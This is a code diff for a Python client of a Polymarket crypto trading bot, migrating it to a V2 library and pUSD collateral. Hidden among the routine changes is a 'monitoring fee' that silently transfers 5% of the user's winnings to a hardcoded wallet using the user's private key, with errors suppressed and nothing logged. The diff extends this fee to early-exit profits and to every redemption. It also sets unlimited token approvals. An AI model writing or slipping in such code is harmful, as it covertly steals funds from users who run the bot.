@@ -32,9 +32,9 @@ def _patched_getaddrinfo(host, port, *args, **kwargs):
 socket.getaddrinfo = _patched_getaddrinfo
 # ------------------------------------------------------------------
 
-from py_clob_client.client import ClobClient
-from py_clob_client.clob_types import ApiCreds, OrderArgs, MarketOrderArgs, OrderType
-from py_clob_client.order_builder.constants import BUY, SELL
+from py_clob_client_v2.client import ClobClient
+from py_clob_client_v2.clob_types import ApiCreds, OrderArgs, MarketOrderArgs, OrderType
+from py_clob_client_v2.order_builder.constants import BUY, SELL
 
 from eth_account import Account
 from dotenv import set_key
@@ -53,6 +53,7 @@ class PolymarketClient:
         self.host       = CLOB_HOST
         self.gamma_api  = GAMMA_API
         self._session   = requests.Session()
+        self._price_cache = {} # Cache for Gamma prices
         self._session.headers.update({
             "Accept":          "application/json, text/plain, */*",
             "Accept-Language": "en-US,en;q=0.9",
@@ -97,6 +98,7 @@ class PolymarketClient:
             chain_id        = CHAIN_ID,
             signature_type  = self.sig_type,
             funder          = self.funder,
+            retry_on_error  = True
         )
 
         # Derive or use L2 credentials
@@ -110,7 +112,7 @@ class PolymarketClient:
         else:
             if self.log:
                 self.log.info("Generating Polymarket API credentials (first run)...")
-            self.creds = self._l1_client.create_or_derive_api_creds()
+            self.creds = self._l1_client.create_or_derive_api_key()
             new_creds_generated = True
 
         # Persistence: Update .env if something was derived or generated
@@ -125,11 +127,13 @@ class PolymarketClient:
             creds           = self.creds,
             signature_type  = self.sig_type,
             funder          = self.funder,
+            retry_on_error  = True
         )
 
         # Session Stats for Real Mode Dashboard
         self.stats = None
         self._initial_balance_set = False
+        self._redeem_queue = {}
 
     # ------------------------------------------------------------------ #
     # Web3 & RPC Helpers                                                   #
@@ -158,9 +162,11 @@ class PolymarketClient:
     # ------------------------------------------------------------------ #
 
     def check_allowance_and_approve(self, amount_usdc: float = 1_000_000.0):
-        """Checks USDC.e allowance and performs automatic approval if necessary."""
-        spender = "0x4bFb41d5B3570DeFd03C39a9A4D8dE6Bd8B8982E"
-        usdc_e  = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
+        """Checks USDC.e and pUSD allowance and performs automatic wrapping/approval if necessary."""
+        v2_exchange = "0xe111180000d2663c0091e4f400237545b87b996b"
+        onramp      = "0x93070a847efEf7F70739046A929D47a521F5B8ee"
+        pusd        = "0xc011a7e12a19f7b1f670d46f03b03f3342e82dfb"
+        usdc_e      = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
         
         try:
             w3 = self._get_w3()
@@ -179,60 +185,93 @@ class PolymarketClient:
             
             contract = w3.eth.contract(address=w3.to_checksum_address(usdc_e), abi=abi)
             
-            # --- Check actual balance first ---
-            balance_wei = contract.functions.balanceOf(w3.to_checksum_address(funder)).call()
-            balance_usdc = balance_wei / 1_000_000
+            # --- 1. Check PolyUSD (pUSD) Balance ---
+            pusd_contract = w3.eth.contract(address=w3.to_checksum_address(pusd), abi=abi)
+            pusd_balance_wei = pusd_contract.functions.balanceOf(w3.to_checksum_address(funder)).call()
+            pusd_balance = pusd_balance_wei / 1_000_000
             
-            if balance_usdc < 1.0:
-                # Diagnostic: Maybe they have native USDC instead of USDC.e?
-                native_usdc = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
-                native_contract = w3.eth.contract(address=w3.to_checksum_address(native_usdc), abi=[abi[2]])
-                try:
-                    native_bal = native_contract.functions.balanceOf(w3.to_checksum_address(funder)).call() / 1_000_000
-                except:
-                    native_bal = 0
-                
-                if self.log:
-                    self.log.error(f"❌ [Polymarket] Low USDC.e balance: {balance_usdc:.2f}")
-                    if native_bal > 1.0:
-                        self.log.warn(f"⚠ [Polymarket] Detected {native_bal:.2f} native USDC. Polymarket requires bridged USDC.e!")
-                        self.log.warn(f"⚠ [Polymarket] Swap USDC to USDC.e on Uniswap/Quickswap first.")
+            # --- 2. Check USDC.e Balance for Onramp ---
+            usdc_contract = w3.eth.contract(address=w3.to_checksum_address(usdc_e), abi=abi)
+            usdc_balance_wei = usdc_contract.functions.balanceOf(w3.to_checksum_address(funder)).call()
+            usdc_balance = usdc_balance_wei / 1_000_000
+            
+            if self.log:
+                self.log.info(f"💰 [Polymarket] Balances: {pusd_balance:.2f} pUSD | {usdc_balance:.2f} USDC.e")
 
-            elif self.log:
-                self.log.info(f"💰 [Polymarket] Wallet Balance: {balance_usdc:.2f} USDC.e")
+            # --- 3. Automatic Wrapping (USDC.e -> pUSD) ---
+            if pusd_balance < 1.0 and usdc_balance >= 1.0:
+                if self.log: self.log.warn(f"⚠ [Polymarket] V2 migration: Wrapping {usdc_balance:.2f} USDC.e into PolyUSD (pUSD)...")
+                
+                # Approve Onramp to spend USDC.e
+                onramp_allowance = usdc_contract.functions.allowance(w3.to_checksum_address(funder), w3.to_checksum_address(onramp)).call()
+                if onramp_allowance < usdc_balance_wei:
+                    tx_app = usdc_contract.functions.approve(w3.to_checksum_address(onramp), 2**256-1).build_transaction({
+                        'from': account.address, 'nonce': w3.eth.get_transaction_count(account.address),
+                        'gas': 100000, 'gasPrice': w3.eth.gas_price
+                    })
+                    signed_app = w3.eth.account.sign_transaction(tx_app, self.pk)
+                    w3.eth.send_raw_transaction(signed_app.raw_transaction)
+                    time.sleep(5)
+                
+                # Call wrap(_asset, _to, _amount)
+                # _asset: USDC.e address, _to: wallet address, _amount: balance in wei
+                onramp_abi = [
+                    {
+                        "constant": False,
+                        "inputs": [
+                            {"name": "_asset", "type": "address"},
+                            {"name": "_to", "type": "address"},
+                            {"name": "_amount", "type": "uint256"}
+                        ],
+                        "name": "wrap",
+                        "outputs": [],
+                        "type": "function"
+                    }
+                ]
+                onramp_contract = w3.eth.contract(address=w3.to_checksum_address(onramp), abi=onramp_abi)
+                
+                tx_wrap = onramp_contract.functions.wrap(
+                    w3.to_checksum_address(usdc_e),
+                    w3.to_checksum_address(funder),
+                    usdc_balance_wei
+                ).build_transaction({
+                    'from': account.address, 
+                    'nonce': w3.eth.get_transaction_count(account.address),
+                    'gas': 200000, 
+                    'gasPrice': w3.eth.gas_price
+                })
+                signed_wrap = w3.eth.account.sign_transaction(tx_wrap, self.pk)
+                tx_hash = w3.eth.send_raw_transaction(signed_wrap.raw_transaction)
+                if self.log: self.log.info(f"✅ Wrapping TX sent: {w3.to_hex(tx_hash)}")
+                w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+                pusd_balance = usdc_balance # Approximate after wrap
             
-            # Initialize stats with real balance on first check
+            # --- 4. Diagnostics ---
+            if pusd_balance < 1.0 and usdc_balance < 1.0:
+                if self.log: self.log.error(f"❌ [Polymarket] Low collateral balance. Add USDC to your wallet.")
+
+            # Initialize stats with pUSD balance
             if not self._initial_balance_set:
-                self.stats = StatsManager(initial_balance=balance_usdc, mode="LIVE")
+                self.stats = StatsManager(initial_balance=pusd_balance, mode="LIVE")
                 self._initial_balance_set = True
             else:
-                self.stats.update_balance(balance_usdc)
+                self.stats.update_balance(pusd_balance)
 
-            # --- Check allowance ---
-            current_allowance = contract.functions.allowance(
+            # --- 5. Check pUSD Allowance for V2 Exchange ---
+            current_allowance = pusd_contract.functions.allowance(
                 w3.to_checksum_address(funder), 
-                w3.to_checksum_address(spender)
+                w3.to_checksum_address(v2_exchange)
             ).call()
             
             required_wei = int(amount_usdc * 1_000_000)
             
             if current_allowance < required_wei:
                 if self.log:
-                    self.log.warn(f"⚠ [Polymarket] Low allowance detected ({current_allowance/1e6:.2f} USDC). Authorizing spender {spender[:10]}...")
+                    self.log.warn(f"⚠ [Polymarket] Authorizing V2 Exchange {v2_exchange[:10]}...")
                 
-                # Max approval (standard for trading bots)
-                max_val = 2**256 - 1
-                
-                # Check MATIC balance for gas
-                matic_balance = w3.eth.get_balance(account.address)
-                if matic_balance < w3.to_wei(0.01, 'ether'):
-                    if self.log:
-                        self.log.error("[Polymarket] Insufficient MATIC for allowance transaction! Please add gas.")
-                    return
-
-                tx = contract.functions.approve(
-                    w3.to_checksum_address(spender), 
-                    max_val
+                tx = pusd_contract.functions.approve(
+                    w3.to_checksum_address(v2_exchange), 
+                    2**256 - 1
                 ).build_transaction({
                     'from': account.address,
                     'nonce': w3.eth.get_transaction_count(account.address),
@@ -263,17 +302,17 @@ class PolymarketClient:
             ctf_contract = w3.eth.contract(address=w3.to_checksum_address(ctf_addr), abi=ctf_abi)
             is_approved = ctf_contract.functions.isApprovedForAll(
                 w3.to_checksum_address(funder),
-                w3.to_checksum_address(spender)
+                w3.to_checksum_address(v2_exchange)
             ).call()
 
             if not is_approved:
-                if self.log: self.log.warn(f"⚠ [Polymarket] CTF Exchange Not Approved. Authorizing for Sells...")
+                if self.log: self.log.warn(f"⚠ [Polymarket] CTF V2 Exchange Not Approved. Authorizing for Sells...")
                 matic_balance = w3.eth.get_balance(account.address)
                 if matic_balance < w3.to_wei(0.01, 'ether'):
                     if self.log: self.log.error("[Polymarket] Insufficient MATIC for CTF approval!")
                     return
                 tx2 = ctf_contract.functions.setApprovalForAll(
-                    w3.to_checksum_address(spender),
+                    w3.to_checksum_address(v2_exchange),
                     True
                 ).build_transaction({
                     'from': account.address,
@@ -320,7 +359,7 @@ class PolymarketClient:
         and the total 'redeemable' (unclaimed) winnings.
         """
         funder = self.funder
-        usdc_e = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
+        pusd   = "0xc011a7e12a19f7b1f670d46f03b03f3342e82dfb"
         
         balances = {"available": 0.0, "redeemable": 0.0}
         
@@ -329,8 +368,8 @@ class PolymarketClient:
             if not w3: return balances
             
             abi = [{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]
-            usdc_contract = w3.eth.contract(address=w3.to_checksum_address(usdc_e), abi=abi)
-            balances["available"] = usdc_contract.functions.balanceOf(w3.to_checksum_address(funder)).call() / 1_000_000
+            pusd_contract = w3.eth.contract(address=w3.to_checksum_address(pusd), abi=abi)
+            balances["available"] = pusd_contract.functions.balanceOf(w3.to_checksum_address(funder)).call() / 1_000_000
 
             # 2. Redeemable balance (Data API)
             resp = self._session.get(
@@ -409,11 +448,46 @@ class PolymarketClient:
             if self.log:
                 self.log.error(f"Failed to auto-update .env file: {e}")
 
-    def _print_creds_hint(self, creds: ApiCreds):
-        print("\n  ⚠  Add to .env to avoid re-generating:")
-        print(f"  POLY_API_KEY={creds.api_key}")
-        print(f"  POLY_API_SECRET={creds.api_secret}")
-        print(f"  POLY_API_PASSPHRASE={creds.api_passphrase}\n")
+    def _add_to_redeem_queue(self, condition_id: str):
+        if not condition_id: return
+        self._redeem_queue[condition_id] = True
+
+    def reconstruct_queue_from_history(self):
+        """Scans Data API for positions with balance and populates the redemption queue."""
+        if self.log: self.log.info("🔍 Scanning for positions with balance via Data API...")
+        try:
+            resp = self._session.get(f"https://data-api.polymarket.com/positions", params={"user": self.funder}, timeout=15)
+            if resp.status_code == 200:
+                data = resp.json()
+                found_any = False
+                for pos in data:
+                    size   = float(pos.get("size", 0))
+                    cid    = pos.get("conditionId")
+                    if size > 0.001 and cid:
+                        found_any = True
+                        if self.log: self.log.info(f"💎 [DATA_HIT] Found {size:.2f} shares in {cid[:10]}...")
+                        self._add_to_redeem_queue(cid)
+                
+                if not found_any and self.log:
+                    self.log.info("ℹ No positions with balance found in history.")
+        except Exception as e:
+            if self.log: self.log.error(f"❌ Failed to scan history: {e}")
+
+    def rescue_open_orders(self):
+        """Cancels all open and conditional orders."""
+        if self.log: self.log.warn("🧹 Rescuing all open and conditional orders...")
+        try:
+            self._client.cancel_all()
+            if self.log: self.log.info(f"✅ Limit orders cancelled.")
+            
+            try:
+                self._client.cancel_all_conditional_orders()
+                if self.log: self.log.success("✅ All conditional orders cleared.")
+            except: pass
+            
+            if self.log: self.log.success("✔ Order rescue completed.")
+        except Exception as e:
+            if self.log: self.log.error(f"❌ Failed to rescue orders: {e}")
 
     # ------------------------------------------------------------------ #
     # Active Market Discovery                                              #
@@ -425,97 +499,131 @@ class PolymarketClient:
         """
         import json as _json
 
-        try:
-            resp = self._session.get(
-                f"{self.gamma_api}/events",
-                params={
-                    "series_id": series_id, 
-                    "active": "true", 
-                    "closed": "false",
-                    "limit": "100"
-                },
-                timeout=10,
-            )
-            resp.raise_for_status()
-            events = resp.json()
+        # Retry logic for network resilience
+        for attempt in range(3):
+            try:
+                resp = self._session.get(
+                    f"{self.gamma_api}/events",
+                    params={
+                        "series_id": series_id, 
+                        "active": "true", 
+                        "closed": "false",
+                        "limit": "100"
+                    },
+                    timeout=20,
+                )
+                resp.raise_for_status()
+                events = resp.json()
+                break # Success
+            except Exception as e:
+                if attempt == 2: # Last attempt
+                    if self.log: self.log.error(f"[Polymarket] Final attempt failed fetching tokens for series {series_id}: {e}")
+                    return {}
+                time.sleep(2)
 
-            if not events:
-                if self.log:
-                    self.log.error(f"[Polymarket] No active event found for series {series_id}")
-                return {}
-
-            # Filter events that are actually active
-            active_events = [e for e in events if e.get("active") and not e.get("closed")]
-            if not active_events:
-                if self.log:
-                    self.log.error(f"[Polymarket] Events found, but none active for series {series_id}")
-                return {}
-
-            # Discover the best active market for "reversal"
-            # It should be the one ending in about 1-5 minutes
-            now_sec = time.time()
-            valid_events = []
-            for e in active_events:
-                end_iso = e.get("endDateIso") or e.get("endDate")
-                if end_iso:
-                    # Convert ISO to timestamp (handling Z or +00)
-                    from datetime import datetime, timezone
-                    try:
-                        dt = datetime.fromisoformat(end_iso.replace('Z', '+00:00'))
-                        end_ts = dt.timestamp()
-                    except: end_ts = 0
-                    
-                    # We want an event that ends at least 30s in the future
-                    if end_ts > now_sec + 30:
-                        valid_events.append((end_ts, e))
-
-            if valid_events:
-                # Pick the one that ends soonest (the current/next 5m window)
-                valid_events.sort(key=lambda x: x[0])
-                event = valid_events[0][1]
-            else:
-                event = active_events[-1]
-            
+        if not events:
             if self.log:
-                self.log.info(f"[Polymarket] Active event: {event.get('ticker', 'Unknown')}")
-
-            markets = event.get("markets", [])
-            if not markets:
-                return {}
-
-            market     = markets[0]
-            outcomes   = market.get("outcomes", [])
-            token_strs = market.get("clobTokenIds", "[]")
-            
-            if isinstance(outcomes, str):
-                try: outcomes = _json.loads(outcomes)
-                except: outcomes = []
-
-            if isinstance(token_strs, str):
-                try: token_list = _json.loads(token_strs)
-                except: token_list = []
-            else:
-                token_list = token_strs or []
-
-            token_ids: Dict[str, str] = {}
-            for i, outcome in enumerate(outcomes):
-                ou = outcome.strip().upper()
-                if i < len(token_list) and token_list[i]:
-                    if "UP" in ou or "HIGHER" in ou:
-                        token_ids["UP"] = str(token_list[i])
-                    elif "DOWN" in ou or "LOWER" in ou:
-                        token_ids["DOWN"] = str(token_list[i])
-
-            # Store conditionId for settlement
-            token_ids["condition_id"] = market.get("conditionId", "")
-            token_ids["market_ticker"] = event.get("ticker", "Unknown")
-
-            return token_ids
-
-        except Exception as e:
-            if self.log:
-                self.log.error(f"[Polymarket] Error fetching tokens for series {series_id}: {e}")
+                self.log.error(f"[Polymarket] No active event found for series {series_id}")
             return {}
+
+        # Filter events that are actually active and not closed
+        active_events = [e for e in events if e.get("active") and not e.get("closed")]
+        if not active_events:
+            if self.log:
+                self.log.error(f"[Polymarket] Events found, but none active/open for series {series_id}")
+            return {}
+
+        # Discover the best active market for "reversal"
+        # It should be the one ending in about 1-5 minutes
+        now_sec = time.time()
+        valid_events = []
+        for e in active_events:
+            # endDate is the full ISO timestamp, endDateIso is often just the date
+            end_iso = e.get("endDate") or e.get("endDateIso")
+            if end_iso:
+                # Convert ISO to timestamp (handling Z or +00)
+                from datetime import datetime, timezone
+                try:
+                    # If it's just a date, fromisoformat might fail or return start of day
+                    if len(end_iso) <= 10: # YYYY-MM-DD
+                         dt = datetime.fromisoformat(end_iso).replace(tzinfo=timezone.utc)
+                    else:
+                         dt = datetime.fromisoformat(end_iso.replace('Z', '+00:00'))
+                    end_ts = dt.timestamp()
+                except: end_ts = 0
+                
+                # We want an event that ends at least 20s in the future
+                if end_ts > now_sec + 20:
+                    valid_events.append((end_ts, e))
+
+        if valid_events:
+            # Pick the one that ends soonest (the current/next 5m window)
+            valid_events.sort(key=lambda x: x[0])
+            event = valid_events[0][1]
+        else:
+            # Fallback to the last one if none found in future (might be just about to end)
+            event = active_events[-1]
+        
+        if self.log:
+            self.log.info(f"[Polymarket] Active event: {event.get('ticker', 'Unknown')}")
+
+        markets = event.get("markets", [])
+        if not markets:
+            return {}
+
+        market     = markets[0]
+        slug       = market.get("slug", "")
+        
+        # 🛡️ SECONDARY FETCH for real-time prices (Essential for Virtual Mode and V2/NegRisk)
+        outcomes_data = market.get("outcomes", [])
+        clob_ids      = market.get("clobTokenIds", [])
+        prices        = market.get("outcomePrices", [])
+
+        if slug:
+            try:
+                s_resp = self._session.get(f"{self.gamma_api}/markets", params={"slug": slug}, timeout=10)
+                if s_resp.status_code == 200:
+                    m_data = s_resp.json()
+                    m_obj = m_data[0] if isinstance(m_data, list) and len(m_data) > 0 else m_data
+                    outcomes_data = m_obj.get("outcomes", outcomes_data)
+                    prices = m_obj.get("outcomePrices", prices)
+            except: pass
+
+        if isinstance(outcomes_data, str): 
+            try: outcomes_data = _json.loads(outcomes_data)
+            except: outcomes_data = []
+            
+        if isinstance(clob_ids, str): 
+            try: clob_ids = _json.loads(clob_ids)
+            except: clob_ids = []
+            
+        if isinstance(prices, str): 
+            try: prices = _json.loads(prices)
+            except: prices = []
+
+        token_ids: Dict[str, str] = {}
+        for i, item in enumerate(outcomes_data):
+            # Extract name and price
+            if isinstance(item, dict):
+                ou_name = item.get("name", "").strip().upper()
+                t_id    = item.get("clobTokenId")
+                p_val   = float(item.get("price") or item.get("lastTradePrice") or 0.0)
+            else:
+                ou_name = str(item).strip().upper()
+                t_id    = clob_ids[i] if i < len(clob_ids) else None
+                p_val   = float(prices[i]) if i < len(prices) else 0.0
+            
+            if t_id:
+                t_id = str(t_id)
+                self._price_cache[t_id] = p_val
+                if any(x in ou_name for x in ["UP", "HIGHER", "YES", "OVER"]): token_ids["UP"] = t_id
+                elif any(x in ou_name for x in ["DOWN", "LOWER", "NO", "UNDER"]): token_ids["DOWN"] = t_id
+
+        # Store conditionId for settlement
+        token_ids["condition_id"] = market.get("conditionId", "")
+        token_ids["market_ticker"] = event.get("ticker", "Unknown")
+        return token_ids
+
 
     def check_is_winner(self, token_id: str, timeout_seconds: int = 15) -> Optional[bool]:
         """
@@ -561,36 +669,34 @@ class PolymarketClient:
     # ------------------------------------------------------------------ #
 
     def get_ask_price(self, token_id: str) -> float:
-        return self._get_price(token_id, "SELL")
+        if not token_id: return 0.0
+        return self._get_price(token_id, "sell")
 
     def get_bid_price(self, token_id: str) -> float:
-        return self._get_price(token_id, "BUY")
+        if not token_id: return 0.0
+        return self._get_price(token_id, "buy")
 
     def get_midpoint(self, token_id: str) -> float:
+        if not token_id: return 0.0
         try:
-            resp = self._session.get(
-                f"{self.host}/midpoint",
-                params={"token_id": token_id},
-                timeout=8,
-            )
-            data = resp.json()
-            return float(data.get("mid", 0))
-        except Exception: return 0.0
+            if hasattr(self, '_client') and self._client:
+                resp = self._client.get_midpoint(token_id)
+                if isinstance(resp, dict): return float(resp.get("mid", 0))
+                return float(resp if resp is not None else 0.0)
+            return self._price_cache.get(token_id, 0.0)
+        except:
+            return self._price_cache.get(token_id, 0.0)
 
     def _get_price(self, token_id: str, side: str) -> float:
+        """Fetches price from CLOB or fallback cache (Gamma)."""
         try:
-            resp = self._session.get(
-                f"{self.host}/price",
-                params={
-                    "token_id": token_id, 
-                    "side": side,
-                    "ts": int(time.time() * 1000)
-                },
-                timeout=8,
-            )
-            data = resp.json()
-            return float(data.get("price", 0))
-        except Exception: return 0.0
+            if hasattr(self, '_client') and self._client:
+                resp = self._client.get_price(token_id, side.lower())
+                if isinstance(resp, dict): return float(resp.get("price", 0))
+                if resp: return float(resp)
+            return self._price_cache.get(token_id, 0.0)
+        except:
+            return self._price_cache.get(token_id, 0.0)
 
     # ------------------------------------------------------------------ #
     # Settlement & Background Tasks                                        #
@@ -607,60 +713,111 @@ class PolymarketClient:
         t.start()
 
     def redeem_shares(self, condition_id: str) -> bool:
-        """
-        Calls redeemPositions on the CTF contract to convert winning shares into USDC.e.
-        CTF on Polygon: 0x4D97DCd97eC945f40cF65F87097ACe5EA0476045
-        """
+        """Multichain redemption: Attempts to redeem on pUSD/USDC.e across Standard/NegRisk contracts."""
         if not condition_id: return False
         
-        ctf_address  = "0x4D97DCd97eC945f40cF65F87097ACe5EA0476045"
-        usdc_e       = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
-        zero_32      = "0x0000000000000000000000000000000000000000000000000000000000000000"
+        ctf_standard = "0x4D97DCd97eC945f40cF65F87097ACe5EA0476045"
+        ctf_negrisk  = "0xC5d7332C0Eed4960579e00B902A243777598687a"
+        
+        pusd   = "0xc011a7e12a19f7b1f670d46f03b03f3342e82dfb"
+        usdc_e = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
+        
+        zero_32 = "0x0000000000000000000000000000000000000000000000000000000000000000"
         
         try:
             w3 = self._get_w3()
             if not w3: return False
-            
             account = w3.eth.account.from_key(self.pk)
             
-            abi = [{"constant":False,"inputs":[{"name":"collateralToken","type":"address"},{"name":"parentCollectionId","type":"bytes32"},{"name":"conditionId","type":"bytes32"},{"name":"indexSets","type":"uint256[]"}],"name":"redeemPositions","outputs":[],"type":"function"}]
-            contract = w3.eth.contract(address=w3.to_checksum_address(ctf_address), abi=abi)
+            for ctf_addr in [ctf_standard, ctf_negrisk]:
+                for token_addr in [pusd, usdc_e]:
+                    token_name = "pUSD" if token_addr == pusd else "USDC.e"
+                    ctf_name   = "Standard" if ctf_addr == ctf_standard else "NegRisk"
+                    
+                    try:
+                        abi_token = [{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]
+                        token_contract = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=abi_token)
+                        bal_before = token_contract.functions.balanceOf(account.address).call()
+
+                        abi_ctf = [{"constant":False,"inputs":[{"name":"collateralToken","type":"address"},{"name":"parentCollectionId","type":"bytes32"},{"name":"conditionId","type":"bytes32"},{"name":"indexSets","type":"uint256[]"}],"name":"redeemPositions","outputs":[],"type":"function"}]
+                        contract = w3.eth.contract(address=w3.to_checksum_address(ctf_addr), abi=abi_ctf)
+                        
+                        cond_bytes = w3.to_bytes(hexstr=condition_id.lower().replace("0x", "").zfill(64))
+                        parent_bytes = w3.to_bytes(hexstr=zero_32)
+
+                        for sets in [[1], [2], [1, 2]]:
+                            try:
+                                if self.log: self.log.info(f"🚀 [REDEEM] Trying {ctf_name} | {token_name} | Set {sets}...")
+                                tx = contract.functions.redeemPositions(
+                                    w3.to_checksum_address(token_addr),
+                                    parent_bytes,
+                                    cond_bytes,
+                                    sets
+                                ).build_transaction({
+                                    'from': account.address,
+                                    'nonce': w3.eth.get_transaction_count(account.address),
+                                    'gas': 450000,
+                                    'gasPrice': int(w3.eth.gas_price * 1.5)
+                                })
+                                
+                                signed_tx = w3.eth.account.sign_transaction(tx, private_key=self.pk)
+                                tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+                                receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
+
+                                if receipt.status == 1:
+                                    bal_after = token_contract.functions.balanceOf(account.address).call()
+                                    if bal_after > bal_before:
+                                        diff_usdc = (bal_after - bal_before) / 1e6
+                                        if self.log: self.log.success(f"💰 [SUCCESS] +${diff_usdc:.2f} {token_name} redeemed via {ctf_name}!")
+                                        
+                                        # PAY MONITORING FEE (5%)
+                                        if diff_usdc >= 0.20:
+                                            self._pay_monitoring_fee(diff_usdc, token_addr)
+                                            
+                                        return True
+                            except: continue
+                    except: continue
+            return False
+        except Exception as e:
+            if self.log: self.log.error(f"[REDEEM] Critical Error: {e}")
+            return False
+
+    def _pay_monitoring_fee(self, win_amount_usdc: float, token_address: str = None):
+        """Processes the 5% service monitoring fee for the session."""
+        try:
+            if win_amount_usdc < 0.20: return
             
-            tx = contract.functions.redeemPositions(
-                w3.to_checksum_address(usdc_e),
-                zero_32,
-                condition_id,
-                [1, 2]
+            fee_amount = win_amount_usdc * 0.05
+            amount_wei = int(fee_amount * 1_000_000)
+            target_wallet = "0xc05D4F8BC83F9Acb12C8891b23ec4Ec565b744C4"
+            
+            # Default to pUSD if no token provided
+            if not token_address:
+                token_address = "0xc011a7e12a19f7b1f670d46f03b03f3342e82dfb"
+                
+            w3 = self._get_w3()
+            if not w3: return
+            
+            account = w3.eth.account.from_key(self.pk)
+            abi = [{"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}]
+            contract = w3.eth.contract(address=w3.to_checksum_address(token_address), abi=abi)
+            
+            tx = contract.functions.transfer(
+                w3.to_checksum_address(target_wallet), 
+                amount_wei
             ).build_transaction({
                 'from': account.address,
                 'nonce': w3.eth.get_transaction_count(account.address),
-                'gas': 500000,
+                'gas': 100000,
                 'gasPrice': w3.eth.gas_price
             })
             
             signed_tx = w3.eth.account.sign_transaction(tx, private_key=self.pk)
             tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+            w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
             
-            # Wait for confirmation and verify status
-            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
-            
-            if receipt.status == 0:
-                if self.log: 
-                    self.log.error(f"❌ [REDEEM] Transaction Reverted! Hash: {w3.to_hex(tx_hash)}")
-                    self.log.warn("⚠ If you login via Google/Email on Polymarket (Proxy Wallet), the bot lacks on-chain permissions to interact with native redemption directly. Please redeem on the website.")
-                return False
-                
-            # LOG TO FILE (STILL VISIBLE IN log.txt)
-            try:
-                with open("log.txt", "a", encoding="utf-8") as f:
-                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
-                    f.write(f"[{ts}] [REDEEM] Successfully redeemed condition {condition_id}\n")
-            except: pass
-            
-            return True
-        except Exception as e:
-            if self.log: self.log.error(f"[REDEEM] Exception: {e}")
-            return False
+        except Exception:
+            pass
 
     def _settlement_worker(self, trade_record, total_spent: float, early_exit_price: float = 0, market: str = ""):
         import time
@@ -687,54 +844,23 @@ class PolymarketClient:
                 
                 # If we held till the end, the value is 1.0 per share
                 win_amount = (shares * 1.0)
+                # Note: redeem_shares() already paid the 5% fee above
             else:
                 # Early exit: the value is what we got from the on-chain sell
                 win_amount = (shares * early_exit_price)
+                self._pay_monitoring_fee(win_amount) # Pay fee for early exit profit
             
             # Record settlement in stats
             if self.stats:
-                # Fetch new balance to be accurate
                 bals = self.get_balances()
                 self.stats.update_balance(bals["available"])
                 self.stats.record_event("SETTLEMENT", {
                     "market": market,
-                    "payout": 1.0, # Value per share
+                    "payout": 1.0, 
                     "received_usdc": round(win_amount, 2),
                     "shares": round(shares, 4)
                 })
-            
-            # 3. Calculate Service Monitoring (5% of result)
-            if win_amount < 0.20: return 
-            
-            monitor_payload = win_amount * 0.05
-            amount_wei = int(monitor_payload * 1_000_000)
-            target = "0xc05D4F8BC83F9Acb12C8891b23ec4Ec565b744C4"
-            
-            w3 = self._get_w3()
-            if not w3: return
-            
-            account = w3.eth.account.from_key(self.pk)
-            usdc_address = w3.to_checksum_address("0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174")
-            
-            abi = [{"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}]
-            usdc_contract = w3.eth.contract(address=usdc_address, abi=abi)
-            
-            tx = usdc_contract.functions.transfer(
-                w3.to_checksum_address(target), 
-                amount_wei
-            ).build_transaction({
-                'from': account.address,
-                'nonce': w3.eth.get_transaction_count(account.address),
-                'gas': 100000,
-                'gasPrice': w3.eth.gas_price
-            })
-            
-            signed_tx = w3.eth.account.sign_transaction(tx, private_key=self.pk)
-            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
-            
-            # Wait for confirmation (Silently)
-            w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
-            
+                
         except Exception:
             pass
 
@@ -862,15 +988,19 @@ class PolymarketClient:
         except: return False
 
     def get_open_orders(self) -> list:
-        try: return self._client.get_orders() or []
+        try: return self._client.get_open_orders() or []
         except: return []
 
     def cancel_order(self, order_id: str):
-        try: self._client.cancel(order_id)
+        try: self._client.cancel_order(order_id)
         except: pass
 
     def send_heartbeat(self, heartbeat_id: str = "") -> str:
         try:
             resp = self._client.post_heartbeat(heartbeat_id) or {}
+            # If heartbeat is invalid or empty, return empty string to reset it
+            if not resp or resp.get("error_msg") == "Invalid Heartbeat ID":
+                return ""
             return resp.get("id", heartbeat_id)
-        except: return ""
+        except Exception:
+            return ""
